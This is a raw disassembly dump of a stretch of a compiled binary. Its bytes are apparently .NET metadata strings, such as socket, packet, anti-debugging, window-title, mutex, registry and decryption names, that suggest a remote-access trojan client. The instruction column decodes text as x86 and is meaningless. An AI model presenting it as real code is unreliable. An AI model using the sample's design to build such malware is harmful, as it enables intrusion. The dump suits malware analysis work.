  4090c5:	73 00                	jae    0x4090c7
  4090c7:	48                   	dec    %eax
  4090c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c9:	73 74                	jae    0x40913f
  4090cb:	73 00                	jae    0x4090cd
  4090cd:	41                   	inc    %ecx
  4090ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4090cf:	74 69                	je     0x40913a
  4090d1:	76 69                	jbe    0x40913c
  4090d3:	72 75                	jb     0x40914a
  4090d5:	73 00                	jae    0x4090d7
  4090d7:	43                   	inc    %ebx
  4090d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4090da:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090dd:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e0:	61                   	popa
  4090e1:	67 65 46             	addr16 gs inc %esi
  4090e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e5:	72 6d                	jb     0x409154
  4090e7:	61                   	popa
  4090e8:	74 00                	je     0x4090ea
  4090ea:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090ec:	72 6d                	jb     0x40915b
  4090ee:	61                   	popa
  4090ef:	74 00                	je     0x4090f1
  4090f1:	57                   	push   %edi
  4090f2:	72 69                	jb     0x40915d
  4090f4:	74 65                	je     0x40915b
  4090f6:	46                   	inc    %esi
  4090f7:	6c                   	insb   (%dx),%es:(%edi)
  4090f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f9:	61                   	popa
  4090fa:	74 00                	je     0x4090fc
  4090fc:	67 65 74 5f          	addr16 gs je 0x40915f
  409100:	41                   	inc    %ecx
  409101:	73 46                	jae    0x409149
  409103:	6c                   	insb   (%dx),%es:(%edi)
  409104:	6f                   	outsl  %ds:(%esi),(%dx)
  409105:	61                   	popa
  409106:	74 00                	je     0x409108
  409108:	73 65                	jae    0x40916f
  40910a:	74 5f                	je     0x40916b
  40910c:	41                   	inc    %ecx
  40910d:	73 46                	jae    0x409155
  40910f:	6c                   	insb   (%dx),%es:(%edi)
  409110:	6f                   	outsl  %ds:(%esi),(%dx)
  409111:	61                   	popa
  409112:	74 00                	je     0x409114
  409114:	47                   	inc    %edi
  409115:	65 74 41             	gs je  0x409159
  409118:	73 46                	jae    0x409160
  40911a:	6c                   	insb   (%dx),%es:(%edi)
  40911b:	6f                   	outsl  %ds:(%esi),(%dx)
  40911c:	61                   	popa
  40911d:	74 00                	je     0x40911f
  40911f:	53                   	push   %ebx
  409120:	65 74 41             	gs je  0x409164
  409123:	73 46                	jae    0x40916b
  409125:	6c                   	insb   (%dx),%es:(%edi)
  409126:	6f                   	outsl  %ds:(%esi),(%dx)
  409127:	61                   	popa
  409128:	74 00                	je     0x40912a
  40912a:	46                   	inc    %esi
  40912b:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409132:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409136:	61                   	popa
  409137:	6e                   	outsb  %ds:(%esi),(%dx)
  409138:	61                   	popa
  409139:	67 65 6d             	gs insl (%dx),%es:(%di)
  40913c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40913e:	74 42                	je     0x409182
  409140:	61                   	popa
  409141:	73 65                	jae    0x4091a8
  409143:	4f                   	dec    %edi
  409144:	62 6a 65             	bound  %ebp,0x65(%edx)
  409147:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40914b:	6f                   	outsl  %ds:(%esi),(%dx)
  40914c:	72 63                	jb     0x4091b1
  40914e:	65 50                	gs push %eax
  409150:	61                   	popa
  409151:	74 68                	je     0x4091bb
  409153:	4f                   	dec    %edi
  409154:	62 6a 65             	bound  %ebp,0x65(%edx)
  409157:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40915b:	6f                   	outsl  %ds:(%esi),(%dx)
  40915c:	6c                   	insb   (%dx),%es:(%edi)
  40915d:	6c                   	insb   (%dx),%es:(%edi)
  40915e:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409163:	6f                   	outsl  %ds:(%esi),(%dx)
  409164:	6e                   	outsb  %ds:(%esi),(%dx)
  409165:	6e                   	outsb  %ds:(%esi),(%dx)
  409166:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40916b:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40916f:	6e                   	outsb  %ds:(%esi),(%dx)
  409170:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409175:	65 74 00             	gs je  0x409178
  409178:	53                   	push   %ebx
  409179:	79 73                	jns    0x4091ee
  40917b:	74 65                	je     0x4091e2
  40917d:	6d                   	insl   (%dx),%es:(%edi)
  40917e:	2e 4e                	cs dec %esi
  409180:	65 74 00             	gs je  0x409183
  409183:	53                   	push   %ebx
  409184:	65 74 00             	gs je  0x409187
  409187:	54                   	push   %esp
  409188:	61                   	popa
  409189:	72 67                	jb     0x4091f2
  40918b:	65 74 00             	gs je  0x40918e
  40918e:	43                   	inc    %ebx
  40918f:	6c                   	insb   (%dx),%es:(%edi)
  409190:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  409197:	6e                   	outsb  %ds:(%esi),(%dx)
  409198:	64 6c                	fs insb (%dx),%es:(%edi)
  40919a:	65 5f                	gs pop %edi
  40919c:	50                   	push   %eax
  40919d:	61                   	popa
  40919e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a1:	74 00                	je     0x4091a3
  4091a3:	4b                   	dec    %ebx
  4091a4:	65 65 70 41          	gs gs jo 0x4091e9
  4091a8:	6c                   	insb   (%dx),%es:(%edi)
  4091a9:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b0:	65 74 00             	gs je  0x4091b3
  4091b3:	43                   	inc    %ebx
  4091b4:	6c                   	insb   (%dx),%es:(%edi)
  4091b5:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091bc:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c0:	53                   	push   %ebx
  4091c1:	79 73                	jns    0x409236
  4091c3:	74 65                	je     0x40922a
  4091c5:	6d                   	insl   (%dx),%es:(%edi)
  4091c6:	2e 43                	cs inc %ebx
  4091c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c9:	6c                   	insb   (%dx),%es:(%edi)
  4091ca:	6c                   	insb   (%dx),%es:(%edi)
  4091cb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d1:	73 2e                	jae    0x409201
  4091d3:	49                   	dec    %ecx
  4091d4:	45                   	inc    %ebp
  4091d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d6:	75 6d                	jne    0x409245
  4091d8:	65 72 61             	gs jb  0x40923c
  4091db:	74 6f                	je     0x40924c
  4091dd:	72 2e                	jb     0x40920d
  4091df:	52                   	push   %edx
  4091e0:	65 73 65             	gs jae 0x409248
  4091e3:	74 00                	je     0x4091e5
  4091e5:	67 65 74 5f          	addr16 gs je 0x409248
  4091e9:	4f                   	dec    %edi
  4091ea:	66 66 73 65          	data16 data16 jae 0x409253
  4091ee:	74 00                	je     0x4091f0
  4091f0:	73 65                	jae    0x409257
  4091f2:	74 5f                	je     0x409253
  4091f4:	4f                   	dec    %edi
  4091f5:	66 66 73 65          	data16 data16 jae 0x40925e
  4091f9:	74 00                	je     0x4091fb
  4091fb:	53                   	push   %ebx
  4091fc:	70 6c                	jo     0x40926a
  4091fe:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409205:	6e 
  409206:	74 4f                	je     0x409257
  409208:	6e                   	outsb  %ds:(%esi),(%dx)
  409209:	45                   	inc    %ebp
  40920a:	78 69                	js     0x409275
  40920c:	74 00                	je     0x40920e
  40920e:	53                   	push   %ebx
  40920f:	61                   	popa
  409210:	6c                   	insb   (%dx),%es:(%edi)
  409211:	74 00                	je     0x409213
  409213:	49                   	dec    %ecx
  409214:	41                   	inc    %ecx
  409215:	73 79                	jae    0x409290
  409217:	6e                   	outsb  %ds:(%esi),(%dx)
  409218:	63 52 65             	arpl   %edx,0x65(%edx)
  40921b:	73 75                	jae    0x409292
  40921d:	6c                   	insb   (%dx),%es:(%edi)
  40921e:	74 00                	je     0x409220
  409220:	54                   	push   %esp
  409221:	6f                   	outsl  %ds:(%esi),(%dx)
  409222:	55                   	push   %ebp
  409223:	70 70                	jo     0x409295
  409225:	65 72 49             	gs jb  0x409271
  409228:	6e                   	outsb  %ds:(%esi),(%dx)
  409229:	76 61                	jbe    0x40928c
  40922b:	72 69                	jb     0x409296
  40922d:	61                   	popa
  40922e:	6e                   	outsb  %ds:(%esi),(%dx)
  40922f:	74 00                	je     0x409231
  409231:	57                   	push   %edi
  409232:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409236:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40923d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409244:	65 
  409245:	43                   	inc    %ebx
  409246:	6c                   	insb   (%dx),%es:(%edi)
  409247:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40924e:	74 5f                	je     0x4092af
  409250:	53                   	push   %ebx
  409251:	73 6c                	jae    0x4092bf
  409253:	43                   	inc    %ebx
  409254:	6c                   	insb   (%dx),%es:(%edi)
  409255:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40925c:	74 5f                	je     0x4092bd
  40925e:	53                   	push   %ebx
  40925f:	73 6c                	jae    0x4092cd
  409261:	43                   	inc    %ebx
  409262:	6c                   	insb   (%dx),%es:(%edi)
  409263:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40926a:	74 5f                	je     0x4092cb
  40926c:	54                   	push   %esp
  40926d:	63 70 43             	arpl   %esi,0x43(%eax)
  409270:	6c                   	insb   (%dx),%es:(%edi)
  409271:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409278:	74 5f                	je     0x4092d9
  40927a:	54                   	push   %esp
  40927b:	63 70 43             	arpl   %esi,0x43(%eax)
  40927e:	6c                   	insb   (%dx),%es:(%edi)
  40927f:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409286:	74 68                	je     0x4092f0
  409288:	65 6e                	outsb  %gs:(%esi),(%dx)
  40928a:	74 69                	je     0x4092f5
  40928c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40928f:	65 41                	gs inc %ecx
  409291:	73 43                	jae    0x4092d6
  409293:	6c                   	insb   (%dx),%es:(%edi)
  409294:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  40929b:	73 74                	jae    0x409311
  40929d:	65 6d                	gs insl (%dx),%es:(%edi)
  40929f:	2e 4d                	cs dec %ebp
  4092a1:	61                   	popa
  4092a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a3:	61                   	popa
  4092a4:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092a9:	74 00                	je     0x4092ab
  4092ab:	45                   	inc    %ebp
  4092ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ad:	76 69                	jbe    0x409318
  4092af:	72 6f                	jb     0x409320
  4092b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b2:	6d                   	insl   (%dx),%es:(%edi)
  4092b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b5:	74 00                	je     0x4092b7
  4092b7:	70 61                	jo     0x40931a
  4092b9:	72 65                	jb     0x409320
  4092bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bc:	74 00                	je     0x4092be
  4092be:	53                   	push   %ebx
  4092bf:	79 73                	jns    0x409334
  4092c1:	74 65                	je     0x409328
  4092c3:	6d                   	insl   (%dx),%es:(%edi)
  4092c4:	2e 43                	cs inc %ebx
  4092c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c7:	6c                   	insb   (%dx),%es:(%edi)
  4092c8:	6c                   	insb   (%dx),%es:(%edi)
  4092c9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4092cf:	73 2e                	jae    0x4092ff
  4092d1:	49                   	dec    %ecx
  4092d2:	45                   	inc    %ebp
  4092d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d4:	75 6d                	jne    0x409343
  4092d6:	65 72 61             	gs jb  0x40933a
  4092d9:	74 6f                	je     0x40934a
  4092db:	72 2e                	jb     0x40930b
  4092dd:	43                   	inc    %ebx
  4092de:	75 72                	jne    0x409352
  4092e0:	72 65                	jb     0x409347
  4092e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e3:	74 00                	je     0x4092e5
  4092e5:	53                   	push   %ebx
  4092e6:	79 73                	jns    0x40935b
  4092e8:	74 65                	je     0x40934f
  4092ea:	6d                   	insl   (%dx),%es:(%edi)
  4092eb:	2e 43                	cs inc %ebx
  4092ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ee:	6c                   	insb   (%dx),%es:(%edi)
  4092ef:	6c                   	insb   (%dx),%es:(%edi)
  4092f0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f6:	73 2e                	jae    0x409326
  4092f8:	49                   	dec    %ecx
  4092f9:	45                   	inc    %ebp
  4092fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fb:	75 6d                	jne    0x40936a
  4092fd:	65 72 61             	gs jb  0x409361
  409300:	74 6f                	je     0x409371
  409302:	72 2e                	jb     0x409332
  409304:	67 65 74 5f          	addr16 gs je 0x409367
  409308:	43                   	inc    %ebx
  409309:	75 72                	jne    0x40937d
  40930b:	72 65                	jb     0x409372
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	74 00                	je     0x409310
  409310:	47                   	inc    %edi
  409311:	65 74 43             	gs je  0x409357
  409314:	75 72                	jne    0x409388
  409316:	72 65                	jb     0x40937d
  409318:	6e                   	outsb  %ds:(%esi),(%dx)
  409319:	74 00                	je     0x40931b
  40931b:	43                   	inc    %ebx
  40931c:	68 65 63 6b 52       	push   $0x526b6365
  409321:	65 6d                	gs insl (%dx),%es:(%edi)
  409323:	6f                   	outsl  %ds:(%esi),(%dx)
  409324:	74 65                	je     0x40938b
  409326:	44                   	inc    %esp
  409327:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40932b:	67 65 72 50          	addr16 gs jb 0x40937f
  40932f:	72 65                	jb     0x409396
  409331:	73 65                	jae    0x409398
  409333:	6e                   	outsb  %ds:(%esi),(%dx)
  409334:	74 00                	je     0x409336
  409336:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40933d:	67 65 72 50          	addr16 gs jb 0x409391
  409341:	72 65                	jb     0x4093a8
  409343:	73 65                	jae    0x4093aa
  409345:	6e                   	outsb  %ds:(%esi),(%dx)
  409346:	74 00                	je     0x409348
  409348:	67 65 74 5f          	addr16 gs je 0x4093ab
  40934c:	52                   	push   %edx
  40934d:	65 6d                	gs insl (%dx),%es:(%edi)
  40934f:	6f                   	outsl  %ds:(%esi),(%dx)
  409350:	74 65                	je     0x4093b7
  409352:	45                   	inc    %ebp
  409353:	6e                   	outsb  %ds:(%esi),(%dx)
  409354:	64 50                	fs push %eax
  409356:	6f                   	outsl  %ds:(%esi),(%dx)
  409357:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40935e:	5f                   	pop    %edi
  40935f:	43                   	inc    %ebx
  409360:	6f                   	outsl  %ds:(%esi),(%dx)
  409361:	75 6e                	jne    0x4093d1
  409363:	74 00                	je     0x409365
  409365:	67 65 74 5f          	addr16 gs je 0x4093c8
  409369:	50                   	push   %eax
  40936a:	72 6f                	jb     0x4093db
  40936c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40936f:	73 6f                	jae    0x4093e0
  409371:	72 43                	jb     0x4093b6
  409373:	6f                   	outsl  %ds:(%esi),(%dx)
  409374:	75 6e                	jne    0x4093e4
  409376:	74 00                	je     0x409378
  409378:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40937b:	6e                   	outsb  %ds:(%esi),(%dx)
  40937c:	74 00                	je     0x40937e
  40937e:	47                   	inc    %edi
  40937f:	65 74 50             	gs je  0x4093d2
  409382:	61                   	popa
  409383:	74 68                	je     0x4093ed
  409385:	52                   	push   %edx
  409386:	6f                   	outsl  %ds:(%esi),(%dx)
  409387:	6f                   	outsl  %ds:(%esi),(%dx)
  409388:	74 00                	je     0x40938a
  40938a:	44                   	inc    %esp
  40938b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40938f:	70 74                	jo     0x409405
  409391:	00 45 6e             	add    %al,0x6e(%ebp)
  409394:	63 72 79             	arpl   %esi,0x79(%edx)
  409397:	70 74                	jo     0x40940d
  409399:	00 50 61             	add    %dl,0x61(%eax)
  40939c:	72 61                	jb     0x4093ff
  40939e:	6d                   	insl   (%dx),%es:(%edi)
  40939f:	65 74 65             	gs je  0x409407
  4093a2:	72 69                	jb     0x40940d
  4093a4:	7a 65                	jp     0x40940b
  4093a6:	64 54                	fs push %esp
  4093a8:	68 72 65 61 64       	push   $0x64616572
  4093ad:	53                   	push   %ebx
  4093ae:	74 61                	je     0x409411
  4093b0:	72 74                	jb     0x409426
  4093b2:	00 43 6f             	add    %al,0x6f(%ebx)
  4093b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b6:	76 65                	jbe    0x40941d
  4093b8:	72 74                	jb     0x40942e
  4093ba:	00 46 61             	add    %al,0x61(%esi)
  4093bd:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093c4:	54 
  4093c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c6:	4c                   	dec    %esp
  4093c7:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093ce:	75 74                	jne    0x409444
  4093d0:	00 53 79             	add    %dl,0x79(%ebx)
  4093d3:	73 74                	jae    0x409449
  4093d5:	65 6d                	gs insl (%dx),%es:(%edi)
  4093d7:	2e 43                	cs inc %ebx
  4093d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093da:	6c                   	insb   (%dx),%es:(%edi)
  4093db:	6c                   	insb   (%dx),%es:(%edi)
  4093dc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e2:	73 2e                	jae    0x409412
  4093e4:	49                   	dec    %ecx
  4093e5:	45                   	inc    %ebp
  4093e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e7:	75 6d                	jne    0x409456
  4093e9:	65 72 61             	gs jb  0x40944d
  4093ec:	74 6f                	je     0x40945d
  4093ee:	72 2e                	jb     0x40941e
  4093f0:	4d                   	dec    %ebp
  4093f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f2:	76 65                	jbe    0x409459
  4093f4:	4e                   	dec    %esi
  4093f5:	65 78 74             	gs js  0x40946c
  4093f8:	00 53 79             	add    %dl,0x79(%ebx)
  4093fb:	73 74                	jae    0x409471
  4093fd:	65 6d                	gs insl (%dx),%es:(%edi)
  4093ff:	2e 54                	cs push %esp
  409401:	65 78 74             	gs js  0x409478
  409404:	00 47 65             	add    %al,0x65(%edi)
  409407:	74 57                	je     0x409460
  409409:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409410:	78 74                	js     0x409486
  409412:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409416:	74 00                	je     0x409418
  409418:	76 00                	jbe    0x40941a
  40941a:	47                   	inc    %edi
  40941b:	65 74 46             	gs je  0x409464
  40941e:	6f                   	outsl  %ds:(%esi),(%dx)
  40941f:	72 65                	jb     0x409486
  409421:	67 72 6f             	addr16 jb 0x409493
  409424:	75 6e                	jne    0x409494
  409426:	64 57                	fs push %edi
  409428:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40942f:	65 74 5f             	gs je  0x409491
  409432:	43                   	inc    %ebx
  409433:	72 65                	jb     0x40949a
  409435:	61                   	popa
  409436:	74 65                	je     0x40949d
  409438:	4e                   	dec    %esi
  409439:	6f                   	outsl  %ds:(%esi),(%dx)
  40943a:	57                   	push   %edi
  40943b:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409442:	6e                   	outsb  %ds:(%esi),(%dx)
  409443:	64 65 78 00          	fs gs js 0x409447
  409447:	43                   	inc    %ebx
  409448:	6c                   	insb   (%dx),%es:(%edi)
  409449:	6f                   	outsl  %ds:(%esi),(%dx)
  40944a:	73 65                	jae    0x4094b1
  40944c:	4d                   	dec    %ebp
  40944d:	75 74                	jne    0x4094c3
  40944f:	65 78 00             	gs js  0x409452
  409452:	43                   	inc    %ebx
  409453:	72 65                	jb     0x4094ba
  409455:	61                   	popa
  409456:	74 65                	je     0x4094bd
  409458:	4d                   	dec    %ebp
  409459:	75 74                	jne    0x4094cf
  40945b:	65 78 00             	gs js  0x40945e
  40945e:	44                   	inc    %esp
  40945f:	65 6c                	gs insb (%dx),%es:(%edi)
  409461:	61                   	popa
  409462:	79 00                	jns    0x409464
  409464:	57                   	push   %edi
  409465:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  40946c:	61                   	popa
  40946d:	79 00                	jns    0x40946f
  40946f:	49                   	dec    %ecx
  409470:	6e                   	outsb  %ds:(%esi),(%dx)
  409471:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409478:	65 
  409479:	41                   	inc    %ecx
  40947a:	72 72                	jb     0x4094ee
  40947c:	61                   	popa
  40947d:	79 00                	jns    0x40947f
  40947f:	4d                   	dec    %ebp
  409480:	73 67                	jae    0x4094e9
  409482:	50                   	push   %eax
  409483:	61                   	popa
  409484:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409487:	72 72                	jb     0x4094fb
  409489:	61                   	popa
  40948a:	79 00                	jns    0x40948c
  40948c:	54                   	push   %esp
  40948d:	6f                   	outsl  %ds:(%esi),(%dx)
  40948e:	41                   	inc    %ecx
  40948f:	72 72                	jb     0x409503
  409491:	61                   	popa
  409492:	79 00                	jns    0x409494
  409494:	67 65 74 5f          	addr16 gs je 0x4094f7
  409498:	41                   	inc    %ecx
  409499:	73 41                	jae    0x4094dc
  40949b:	72 72                	jb     0x40950f
  40949d:	61                   	popa
  40949e:	79 00                	jns    0x4094a0
  4094a0:	72 65                	jb     0x409507
  4094a2:	66 41                	inc    %cx
  4094a4:	73 41                	jae    0x4094e7
  4094a6:	72 72                	jb     0x40951a
  4094a8:	61                   	popa
  4094a9:	79 00                	jns    0x4094ab
  4094ab:	67 65 74 5f          	addr16 gs je 0x40950e
  4094af:	4b                   	dec    %ebx
  4094b0:	65 79 00             	gs jns 0x4094b3
  4094b3:	73 65                	jae    0x40951a
  4094b5:	74 5f                	je     0x409516
  4094b7:	4b                   	dec    %ebx
  4094b8:	65 79 00             	gs jns 0x4094bb
  4094bb:	43                   	inc    %ebx
  4094bc:	72 65                	jb     0x409523
  4094be:	61                   	popa
  4094bf:	74 65                	je     0x409526
  4094c1:	53                   	push   %ebx
  4094c2:	75 62                	jne    0x409526
  4094c4:	4b                   	dec    %ebx
  4094c5:	65 79 00             	gs jns 0x4094c8
  4094c8:	44                   	inc    %esp
  4094c9:	65 6c                	gs insb (%dx),%es:(%edi)
  4094cb:	65 74 65             	gs je  0x409533
  4094ce:	53                   	push   %ebx
  4094cf:	75 62                	jne    0x409533
  4094d1:	4b                   	dec    %ebx
  4094d2:	65 79 00             	gs jns 0x4094d5
  4094d5:	4f                   	dec    %edi
  4094d6:	70 65                	jo     0x40953d
  4094d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4094d9:	53                   	push   %ebx
  4094da:	75 62                	jne    0x40953e
  4094dc:	4b                   	dec    %ebx
  4094dd:	65 79 00             	gs jns 0x4094e0
  4094e0:	67 65 74 5f          	addr16 gs je 0x409543
  4094e4:	50                   	push   %eax
  4094e5:	75 62                	jne    0x409549
  4094e7:	6c                   	insb   (%dx),%es:(%edi)
  4094e8:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094ef:	61                   	popa
  4094f0:	75 74                	jne    0x409566
  4094f2:	68 4b 65 79 00       	push   $0x79654b
  4094f7:	6d                   	insl   (%dx),%es:(%edi)
  4094f8:	61                   	popa
  4094f9:	73 74                	jae    0x40956f
  4094fb:	65 72 4b             	gs jb  0x409549
  4094fe:	65 79 00             	gs jns 0x409501
  409501:	52                   	push   %edx
  409502:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409509:	4b 65 
  40950b:	79 00                	jns    0x40950d
  40950d:	5f                   	pop    %edi
  40950e:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409512:	53                   	push   %ebx
  409513:	79 73                	jns    0x409588
  409515:	74 65                	je     0x40957c
  409517:	6d                   	insl   (%dx),%es:(%edi)
  409518:	2e 53                	cs push %ebx
  40951a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40951e:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409525:	70 
  409526:	74 6f                	je     0x409597
  409528:	67 72 61             	addr16 jb 0x40958c
  40952b:	70 68                	jo     0x409595
  40952d:	79 00                	jns    0x40952f
  40952f:	41                   	inc    %ecx
  409530:	73 73                	jae    0x4095a5
  409532:	65 6d                	gs insl (%dx),%es:(%edi)
  409534:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409538:	41                   	inc    %ecx
  409539:	64 64 72 65          	fs fs jb 0x4095a2
  40953d:	73 73                	jae    0x4095b2
  40953f:	46                   	inc    %esi
  409540:	61                   	popa
  409541:	6d                   	insl   (%dx),%es:(%edi)
  409542:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409549:	63 
  40954a:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  40954e:	79 00                	jns    0x409550
  409550:	57                   	push   %edi
  409551:	72 69                	jb     0x4095bc
  409553:	74 65                	je     0x4095ba
  409555:	42                   	inc    %edx
  409556:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  40955d:	6f                   	outsl  %ds:(%esi),(%dx)
  40955e:	42                   	inc    %edx
  40955f:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409566:	65 74 5f             	gs je  0x4095c8
  409569:	53                   	push   %ebx
  40956a:	79 73                	jns    0x4095df
  40956c:	74 65                	je     0x4095d3
  40956e:	6d                   	insl   (%dx),%es:(%edi)
  40956f:	44                   	inc    %esp
  409570:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409577:	79 00                	jns    0x409579
  409579:	53                   	push   %ebx
  40957a:	65 74 52             	gs je  0x4095cf
  40957d:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409584:	00 6f 
  409586:	70 5f                	jo     0x4095e7
  409588:	45                   	inc    %ebp
  409589:	71 75                	jno    0x409600
  40958b:	61                   	popa
  40958c:	6c                   	insb   (%dx),%es:(%edi)
  40958d:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409594:	49 
  409595:	6e                   	outsb  %ds:(%esi),(%dx)
  409596:	65 71 75             	gs jno 0x40960e
  409599:	61                   	popa
  40959a:	6c                   	insb   (%dx),%es:(%edi)
  40959b:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095a2:	74 
  4095a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4095a5:	2e 4e                	cs dec %esi
  4095a7:	65 74 2e             	gs je  0x4095d8
  4095aa:	53                   	push   %ebx
  4095ab:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095af:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095b6:	64 
  4095b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b8:	77 73                	ja     0x40962d
  4095ba:	49                   	dec    %ecx
  4095bb:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095be:	74 69                	je     0x409629
  4095c0:	74 79                	je     0x40963b
  4095c2:	00 49 73             	add    %cl,0x73(%ecx)
  4095c5:	4e                   	dec    %esi
  4095c6:	75 6c                	jne    0x409634
  4095c8:	6c                   	insb   (%dx),%es:(%edi)
  4095c9:	4f                   	dec    %edi
  4095ca:	72 45                	jb     0x409611
  4095cc:	6d                   	insl   (%dx),%es:(%edi)
  4095cd:	70 74                	jo     0x409643
  4095cf:	79 00                	jns    0x4095d1
  4095d1:	00 00                	add    %al,(%eax)
  4095d3:	00 00                	add    %al,(%eax)
  4095d5:	0d 53 00 48 00       	or     $0x480053,%eax
  4095da:	41                   	inc    %ecx
  4095db:	00 32                	add    %dh,(%edx)
  4095dd:	00 35 00 36 00 00    	add    %dh,0x3600
  4095e3:	80 d9 79             	sbb    $0x79,%cl
